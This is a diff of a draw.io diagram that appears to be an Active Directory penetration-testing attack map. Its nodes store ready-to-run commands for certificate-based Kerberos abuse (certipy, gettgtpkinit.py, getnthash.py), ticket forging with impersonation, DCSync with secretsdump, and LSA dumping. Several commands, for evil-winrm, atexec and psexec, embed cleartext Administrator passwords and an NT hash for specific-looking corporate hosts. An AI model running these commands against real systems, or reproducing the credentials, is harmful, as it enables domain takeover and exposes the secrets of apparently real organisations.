@@ -1362,20 +1362,19 @@
         <mxCell id="nNKB30-F6r5E_Skve4N4-2" value="Accès machine" style="rounded=1;whiteSpace=wrap;html=1;fillColor=#a20025;fontColor=#ffffff;strokeColor=#6F0000;" parent="1" vertex="1">
           <mxGeometry x="1840" y="540" width="120" height="60" as="geometry" />
         </mxCell>
-        <mxCell id="ofW6ee_2hHjbur6R9mH3-2" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="nNKB30-F6r5E_Skve4N4-3" target="ofW6ee_2hHjbur6R9mH3-1" edge="1">
-          <mxGeometry relative="1" as="geometry" />
+        <mxCell id="O8suuC-I_sYxK1o4V1yx-11" style="edgeStyle=orthogonalEdgeStyle;shape=connector;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;fillColor=#e1d5e7;" edge="1" parent="1" source="nNKB30-F6r5E_Skve4N4-3" target="TZj8oe7FIHMln2289y6j-1">
+          <mxGeometry relative="1" as="geometry">
+            <Array as="points">
+              <mxPoint x="1030" y="698" />
+              <mxPoint x="1030" y="570" />
+            </Array>
+          </mxGeometry>
         </mxCell>
-        <mxCell id="nNKB30-F6r5E_Skve4N4-3" value="&lt;div&gt;Pass the certificate&lt;br&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12&lt;/font&gt;&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;gettgtpkinit.py -pfx-base64 $(cat cert.b64) &#39;essos.local&#39;/&#39;meereen$&#39; &#39;meereen.ccache&#39;&lt;/font&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
-          <mxGeometry x="520" y="507.5" width="320" height="125" as="geometry" />
+        <mxCell id="nNKB30-F6r5E_Skve4N4-3" value="&lt;div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12&lt;/font&gt;&lt;/div&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
+          <mxGeometry x="560" y="665" width="320" height="66.5" as="geometry" />
         </mxCell>
         <mxCell id="c2D2YZhtQaV_8EULeIIU-1" value="&lt;div align=&quot;left&quot;&gt;If clock errors:&lt;br&gt;&lt;/div&gt;&lt;div align=&quot;left&quot;&gt;-detect remote clock-skew : nmap -sV -sC 10.10.11.202&lt;/div&gt;&lt;div align=&quot;left&quot;&gt;- faketime -f &#39;+2h&#39; zsh&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;align=left;fillColor=#f0a30a;strokeColor=#BD7000;fontColor=#000000;" parent="1" vertex="1">
           <mxGeometry x="520" y="414" width="320" height="80" as="geometry" />
-        </mxCell>
-        <mxCell id="ofW6ee_2hHjbur6R9mH3-3" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="ofW6ee_2hHjbur6R9mH3-1" target="TZj8oe7FIHMln2289y6j-1" edge="1">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <mxCell id="ofW6ee_2hHjbur6R9mH3-1" value="Get TGT ticket" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
-          <mxGeometry x="890" y="540" width="120" height="60" as="geometry" />
         </mxCell>
         <mxCell id="TZj8oe7FIHMln2289y6j-2" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;" parent="1" source="TZj8oe7FIHMln2289y6j-1" target="Mr1Rn-nBtmzZ--9cH1cQ-3" edge="1">
           <mxGeometry relative="1" as="geometry" />
@@ -1387,66 +1386,52 @@
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <mxCell id="4FQnS6Lhucq9dQavcaFJ-1" value="Local Admin creds" style="rounded=1;whiteSpace=wrap;html=1;fontSize=13;fillColor=#fa6800;strokeColor=#C73500;fontColor=#000000;" parent="1" vertex="1">
-          <mxGeometry x="250" y="1020" width="150" height="80" as="geometry" />
+          <mxGeometry x="61" y="1560" width="150" height="80" as="geometry" />
         </mxCell>
         <mxCell id="4FQnS6Lhucq9dQavcaFJ-2" value="Interactive shell" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
-          <mxGeometry x="631" y="890" width="120" height="60" as="geometry" />
+          <mxGeometry x="442" y="1430" width="120" height="60" as="geometry" />
         </mxCell>
         <mxCell id="4FQnS6Lhucq9dQavcaFJ-3" value="Interactive shell" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
-          <mxGeometry x="631" y="980" width="120" height="60" as="geometry" />
+          <mxGeometry x="442" y="1520" width="120" height="60" as="geometry" />
         </mxCell>
         <mxCell id="4RrfTOFXURJHPVGyKrM7-6" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" parent="1" source="4FQnS6Lhucq9dQavcaFJ-4" target="4RrfTOFXURJHPVGyKrM7-5" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <object label="&lt;div&gt;pseudo shell&lt;/div&gt;" id="4FQnS6Lhucq9dQavcaFJ-4">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#000000;" parent="1" vertex="1">
-            <mxGeometry x="631" y="1060" width="120" height="60" as="geometry" />
+            <mxGeometry x="442" y="1600" width="120" height="60" as="geometry" />
           </mxCell>
         </object>
         <object label="WinRM" clear_password="evil-winrm -u &quot;administrator&quot; -p &#39;,TsE1h73!Dk/bcs&#39; -i &quot;USBG6W10400.group.int&quot;" pth="evil-winrm -u &#39;gmendoza1!&#39; -H &#39;b2ba5fb4a699cbf08a24fc175d373fd5&#39; -i &quot;10.248.2.86&quot;" id="4FQnS6Lhucq9dQavcaFJ-5">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" parent="1" vertex="1">
-            <mxGeometry x="631" y="1150" width="120" height="60" as="geometry" />
+            <mxGeometry x="442" y="1690" width="120" height="60" as="geometry" />
           </mxCell>
         </object>
         <mxCell id="4FQnS6Lhucq9dQavcaFJ-6" value="Rdp" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
-          <mxGeometry x="631" y="1240.5" width="120" height="60" as="geometry" />
+          <mxGeometry x="442" y="1780.5" width="120" height="60" as="geometry" />
         </mxCell>
         <mxCell id="4FQnS6Lhucq9dQavcaFJ-7" value="&amp;nbsp;Admin access" style="rounded=1;whiteSpace=wrap;html=1;fontSize=13;fillColor=#ffe6cc;strokeColor=#d79b00;" parent="1" vertex="1">
-          <mxGeometry x="1220" y="1060" width="150" height="80" as="geometry" />
+          <mxGeometry x="1031" y="1600" width="150" height="80" as="geometry" />
         </mxCell>
         <mxCell id="4RrfTOFXURJHPVGyKrM7-1" value="Domain Admin creds" style="rounded=1;whiteSpace=wrap;html=1;fontSize=13;fillColor=#ffe6cc;strokeColor=#d79b00;" parent="1" vertex="1">
-          <mxGeometry x="1439" y="1070" width="150" height="80" as="geometry" />
+          <mxGeometry x="1250" y="1610" width="150" height="80" as="geometry" />
         </mxCell>
         <mxCell id="4RrfTOFXURJHPVGyKrM7-4" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;" parent="1" source="4RrfTOFXURJHPVGyKrM7-2" target="4RrfTOFXURJHPVGyKrM7-1" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <object label="&lt;div&gt;Dump password lsa, sam&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;cme&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" cme="cme smb USBG6L10319.group.int -u &#39;Administrator&#39; -p &#39;ZK12]N{3gE+Sz-8&#39; --local-auth --lsa" id="4RrfTOFXURJHPVGyKrM7-2">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
-            <mxGeometry x="650" y="1420" width="120" height="60" as="geometry" />
+            <mxGeometry x="461" y="1960" width="120" height="60" as="geometry" />
           </mxCell>
         </object>
         <object label="atexec" clear_password="atexec.py &#39;Administrator&#39;:&#39;9Q.2Kg83J(;6PyN&#39;@USBG6DISP02.group.int cmd.exe" id="4RrfTOFXURJHPVGyKrM7-5">
           <mxCell style="whiteSpace=wrap;html=1;strokeColor=#e5a50a;rounded=1;" parent="1" vertex="1">
-            <mxGeometry x="860" y="1060" width="120" height="60" as="geometry" />
+            <mxGeometry x="671" y="1600" width="120" height="60" as="geometry" />
           </mxCell>
         </object>
         <object label="psexec" clear_password="psexec.py &#39;Administrator&#39;:&#39;ui[QFD)h%Lev21/&#39;@USBG6L10443.group.int" id="4RrfTOFXURJHPVGyKrM7-7">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" parent="1" vertex="1">
-            <mxGeometry x="860" y="1130" width="120" height="60" as="geometry" />
-          </mxCell>
-        </object>
-        <mxCell id="dODqLdi3JbQZ3gRgPju0-1" style="edgeStyle=segmentEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;" edge="1" parent="1" source="dODqLdi3JbQZ3gRgPju0-2" target="dODqLdi3JbQZ3gRgPju0-4">
-          <mxGeometry relative="1" as="geometry">
-            <Array as="points">
-              <mxPoint x="2660" y="821" />
-              <mxPoint x="2660" y="750" />
-              <mxPoint x="2970" y="750" />
-            </Array>
-          </mxGeometry>
-        </mxCell>
-        <object label="Pass the certificate" create_ticket="gettgtpkinit.py -pfx-base64 $(cat cert.b64) &#39;essos.local&#39;/&#39;meereen$&#39; &#39;meereen.ccache&#39;" id="dODqLdi3JbQZ3gRgPju0-2">
-          <mxCell style="whiteSpace=wrap;html=1;rounded=1;fillColor=default;strokeColor=#d79b00;" vertex="1" parent="1">
-            <mxGeometry x="2514" y="791" width="120" height="60" as="geometry" />
+            <mxGeometry x="671" y="1670" width="120" height="60" as="geometry" />
           </mxCell>
         </object>
         <mxCell id="dODqLdi3JbQZ3gRgPju0-3" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="dODqLdi3JbQZ3gRgPju0-4" target="dODqLdi3JbQZ3gRgPju0-5">
@@ -1454,105 +1439,54 @@
         </mxCell>
         <object label="&lt;div&gt;DCsync&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;secretdump.py&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" cmd="secretsdump -k -no-pass OLYMPIQUELYONNAIS.COM/&#39;DC01$&#39;@DC03.OLYMPIQUELYONNAIS.COM" id="dODqLdi3JbQZ3gRgPju0-4">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="1">
-            <mxGeometry x="2910" y="786" width="120" height="60" as="geometry" />
+            <mxGeometry x="1106" y="936" width="120" height="60" as="geometry" />
           </mxCell>
         </object>
         <mxCell id="dODqLdi3JbQZ3gRgPju0-5" value="Get NT hash of domains admins" style="whiteSpace=wrap;html=1;rounded=1;" vertex="1" parent="1">
-          <mxGeometry x="3080" y="786" width="120" height="60" as="geometry" />
+          <mxGeometry x="1276" y="936" width="120" height="60" as="geometry" />
         </mxCell>
-        <mxCell id="dODqLdi3JbQZ3gRgPju0-6" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;strokeColor=default;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=11;fontColor=default;fontStyle=0;labelBackgroundColor=default;endArrow=classic;endFill=1;" edge="1" parent="1" source="dODqLdi3JbQZ3gRgPju0-8" target="dODqLdi3JbQZ3gRgPju0-4">
+        <mxCell id="dODqLdi3JbQZ3gRgPju0-7" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#2F5B7C;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;labelBackgroundColor=default;endArrow=block;strokeWidth=3;fontStyle=0;endFill=1;fillColor=#e1d5e7;" edge="1" parent="1" source="dODqLdi3JbQZ3gRgPju0-8" target="dODqLdi3JbQZ3gRgPju0-12">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="dODqLdi3JbQZ3gRgPju0-7" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=default;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=11;fontColor=default;labelBackgroundColor=default;endArrow=classic;" edge="1" parent="1" source="dODqLdi3JbQZ3gRgPju0-8" target="dODqLdi3JbQZ3gRgPju0-12">
+        <mxCell id="O8suuC-I_sYxK1o4V1yx-6" style="edgeStyle=orthogonalEdgeStyle;shape=connector;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;fillColor=#e1d5e7;" edge="1" parent="1" source="dODqLdi3JbQZ3gRgPju0-8" target="TZj8oe7FIHMln2289y6j-1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <object label="&lt;div align=&quot;justify&quot;&gt;- Get TGT with ASREP key&amp;nbsp;&lt;/div&gt;&lt;div align=&quot;justify&quot;&gt;- Send TGT to get ST&amp;nbsp;&lt;/div&gt;&lt;div align=&quot;justify&quot;&gt;- Extract NThash from ST&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;getnthash.py&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" cmd="getnthash.py -key 0749d5ec9a1bca37d57ca7e9388f00b4c31c9ac0df0c3583484672764ff4752c -dc-ip 10.240.5.1 &#39;olympiquelyonnais.com&#39;/&#39;DC01\$&#39;" id="dODqLdi3JbQZ3gRgPju0-8">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" vertex="1" parent="1">
-            <mxGeometry x="2684" y="852.5" width="176" height="85" as="geometry" />
+            <mxGeometry x="760" y="527.5" width="176" height="85" as="geometry" />
           </mxCell>
         </object>
-        <mxCell id="dODqLdi3JbQZ3gRgPju0-9" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;" edge="1" parent="1" source="dODqLdi3JbQZ3gRgPju0-10" target="dODqLdi3JbQZ3gRgPju0-8">
+        <mxCell id="dODqLdi3JbQZ3gRgPju0-9" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;fillColor=#e1d5e7;" edge="1" parent="1" source="dODqLdi3JbQZ3gRgPju0-10" target="dODqLdi3JbQZ3gRgPju0-8">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <object label="&lt;div&gt;get ASREP key via preauth kerberos&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;gettgtpkinit.py&lt;/font&gt;&lt;/div&gt;" cmd="gettgtpkinit.py -pfx-base64 $(cat cert.b64) &#39;essos.local&#39;/&#39;meereen$&#39; &#39;meereen.ccache&#39;" id="dODqLdi3JbQZ3gRgPju0-10">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" vertex="1" parent="1">
-            <mxGeometry x="2520" y="865" width="120" height="60" as="geometry" />
+            <mxGeometry x="562" y="540" width="120" height="60" as="geometry" />
           </mxCell>
         </object>
-        <mxCell id="dODqLdi3JbQZ3gRgPju0-11" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="dODqLdi3JbQZ3gRgPju0-12" target="dODqLdi3JbQZ3gRgPju0-13">
+        <mxCell id="dODqLdi3JbQZ3gRgPju0-11" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;fillColor=#e1d5e7;" edge="1" parent="1" source="dODqLdi3JbQZ3gRgPju0-12" target="dODqLdi3JbQZ3gRgPju0-13">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <object label="&lt;div&gt;Forge ST (from NThash)&lt;/div&gt;" spn_WINRM="getST.py -self -impersonate MHADM -altservice HOST/DC01.olympiquelyonnais.com -k -no-pass -dc-ip 10.240.5.1 olympiquelyonnais.com/DC01$" id="dODqLdi3JbQZ3gRgPju0-12">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" vertex="1" parent="1">
-            <mxGeometry x="2970" y="937.5" width="120" height="60" as="geometry" />
+            <mxGeometry x="1070" y="745" width="120" height="60" as="geometry" />
           </mxCell>
         </object>
         <object label="add user into domain admins group" id="dODqLdi3JbQZ3gRgPju0-13">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#000000;" vertex="1" parent="1">
-            <mxGeometry x="3160" y="937.5" width="120" height="60" as="geometry" />
+            <mxGeometry x="1260" y="745" width="120" height="60" as="geometry" />
           </mxCell>
         </object>
-        <mxCell id="dODqLdi3JbQZ3gRgPju0-14" style="edgeStyle=segmentEdgeStyle;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;" edge="1" parent="1" source="dODqLdi3JbQZ3gRgPju0-15" target="dODqLdi3JbQZ3gRgPju0-17">
-          <mxGeometry relative="1" as="geometry">
-            <Array as="points">
-              <mxPoint x="348" y="1701" />
-              <mxPoint x="348" y="1630" />
-              <mxPoint x="658" y="1630" />
-            </Array>
-          </mxGeometry>
-        </mxCell>
-        <object label="Pass the certificate" create_ticket="gettgtpkinit.py -pfx-base64 $(cat cert.b64) &#39;essos.local&#39;/&#39;meereen$&#39; &#39;meereen.ccache&#39;" id="dODqLdi3JbQZ3gRgPju0-15">
-          <mxCell style="whiteSpace=wrap;html=1;rounded=1;fillColor=default;strokeColor=#d79b00;" vertex="1" parent="1">
-            <mxGeometry x="202" y="1671" width="120" height="60" as="geometry" />
-          </mxCell>
-        </object>
-        <mxCell id="dODqLdi3JbQZ3gRgPju0-16" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="dODqLdi3JbQZ3gRgPju0-17" target="dODqLdi3JbQZ3gRgPju0-18">
+        <mxCell id="O8suuC-I_sYxK1o4V1yx-3" style="edgeStyle=orthogonalEdgeStyle;shape=connector;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;fillColor=#e1d5e7;" edge="1" parent="1" source="dODqLdi3JbQZ3gRgPju0-27" target="O8suuC-I_sYxK1o4V1yx-1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <object label="&lt;div&gt;DCsync&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;secretdump.py&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" cmd="secretsdump -k -no-pass OLYMPIQUELYONNAIS.COM/&#39;DC01$&#39;@DC03.OLYMPIQUELYONNAIS.COM" id="dODqLdi3JbQZ3gRgPju0-17">
-          <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;movable=1;resizable=1;rotatable=1;deletable=1;editable=1;locked=0;connectable=1;" vertex="1" parent="1">
-            <mxGeometry x="598" y="1666" width="120" height="60" as="geometry" />
-          </mxCell>
-        </object>
-        <mxCell id="dODqLdi3JbQZ3gRgPju0-18" value="Get NT hash of domains admins" style="whiteSpace=wrap;html=1;rounded=1;" vertex="1" parent="1">
-          <mxGeometry x="768" y="1666" width="120" height="60" as="geometry" />
-        </mxCell>
-        <mxCell id="dODqLdi3JbQZ3gRgPju0-19" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;strokeColor=default;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=11;fontColor=default;fontStyle=0;labelBackgroundColor=default;endArrow=classic;endFill=1;" edge="1" parent="1" source="dODqLdi3JbQZ3gRgPju0-21" target="dODqLdi3JbQZ3gRgPju0-17">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <mxCell id="dODqLdi3JbQZ3gRgPju0-20" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=default;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=11;fontColor=default;labelBackgroundColor=default;endArrow=classic;" edge="1" parent="1" source="dODqLdi3JbQZ3gRgPju0-21" target="dODqLdi3JbQZ3gRgPju0-25">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <object label="&lt;div align=&quot;justify&quot;&gt;- Get TGT with ASREP key&amp;nbsp;&lt;/div&gt;&lt;div align=&quot;justify&quot;&gt;- Send TGT to get ST&amp;nbsp;&lt;/div&gt;&lt;div align=&quot;justify&quot;&gt;- Extract NThash from ST&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;getnthash.py&lt;/font&gt;&lt;br&gt;&lt;/div&gt;" cmd="getnthash.py -key 0749d5ec9a1bca37d57ca7e9388f00b4c31c9ac0df0c3583484672764ff4752c -dc-ip 10.240.5.1 &#39;olympiquelyonnais.com&#39;/&#39;DC01\$&#39;" id="dODqLdi3JbQZ3gRgPju0-21">
-          <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" vertex="1" parent="1">
-            <mxGeometry x="372" y="1732.5" width="176" height="85" as="geometry" />
-          </mxCell>
-        </object>
-        <mxCell id="dODqLdi3JbQZ3gRgPju0-22" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;" edge="1" parent="1" source="dODqLdi3JbQZ3gRgPju0-23" target="dODqLdi3JbQZ3gRgPju0-21">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <object label="&lt;div&gt;get ASREP key via preauth kerberos&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#2a7bde&quot;&gt;gettgtpkinit.py&lt;/font&gt;&lt;/div&gt;" cmd="gettgtpkinit.py -pfx-base64 $(cat cert.b64) &#39;essos.local&#39;/&#39;meereen$&#39; &#39;meereen.ccache&#39;" id="dODqLdi3JbQZ3gRgPju0-23">
-          <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" vertex="1" parent="1">
-            <mxGeometry x="208" y="1745" width="120" height="60" as="geometry" />
-          </mxCell>
-        </object>
-        <mxCell id="dODqLdi3JbQZ3gRgPju0-24" value="" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;" edge="1" parent="1" source="dODqLdi3JbQZ3gRgPju0-25" target="dODqLdi3JbQZ3gRgPju0-26">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <object label="&lt;div&gt;Forge ST (from NThash)&lt;/div&gt;" spn_WINRM="getST.py -self -impersonate MHADM -altservice HOST/DC01.olympiquelyonnais.com -k -no-pass -dc-ip 10.240.5.1 olympiquelyonnais.com/DC01$" id="dODqLdi3JbQZ3gRgPju0-25">
-          <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#e5a50a;" vertex="1" parent="1">
-            <mxGeometry x="658" y="1817.5" width="120" height="60" as="geometry" />
-          </mxCell>
-        </object>
-        <object label="add user into domain admins group" id="dODqLdi3JbQZ3gRgPju0-26">
-          <mxCell style="rounded=1;whiteSpace=wrap;html=1;strokeColor=#000000;" vertex="1" parent="1">
-            <mxGeometry x="848" y="1817.5" width="120" height="60" as="geometry" />
-          </mxCell>
-        </object>
         <mxCell id="dODqLdi3JbQZ3gRgPju0-27" value="Lateral mouv" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
-          <mxGeometry x="-50" y="610" width="120" height="60" as="geometry" />
+          <mxGeometry x="-110" y="720" width="120" height="60" as="geometry" />
         </mxCell>
-        <mxCell id="O8suuC-I_sYxK1o4V1yx-2" value="" style="edgeStyle=orthogonalEdgeStyle;shape=connector;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;fillColor=#e1d5e7;" edge="1" parent="1" source="O8suuC-I_sYxK1o4V1yx-1" target="nNKB30-F6r5E_Skve4N4-3">
+        <mxCell id="O8suuC-I_sYxK1o4V1yx-9" style="edgeStyle=orthogonalEdgeStyle;shape=connector;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;fillColor=#e1d5e7;" edge="1" parent="1" source="O8suuC-I_sYxK1o4V1yx-1" target="dODqLdi3JbQZ3gRgPju0-10">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="O8suuC-I_sYxK1o4V1yx-10" style="edgeStyle=orthogonalEdgeStyle;shape=connector;rounded=1;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;strokeColor=#2F5B7C;strokeWidth=3;align=center;verticalAlign=middle;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=0;labelBackgroundColor=default;endArrow=block;endFill=1;fillColor=#e1d5e7;" edge="1" parent="1" source="O8suuC-I_sYxK1o4V1yx-1" target="nNKB30-F6r5E_Skve4N4-3">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <mxCell id="O8suuC-I_sYxK1o4V1yx-1" value="Certificat" style="whiteSpace=wrap;html=1;rounded=1;shadow=0;align=center;verticalAlign=middle;spacing=6;fontFamily=Helvetica;fontSize=12;fontColor=#FFFFFF;fontStyle=1;fillColor=#12aab5;gradientColor=none;strokeColor=default;spacingBottom=22;" vertex="1" parent="1">
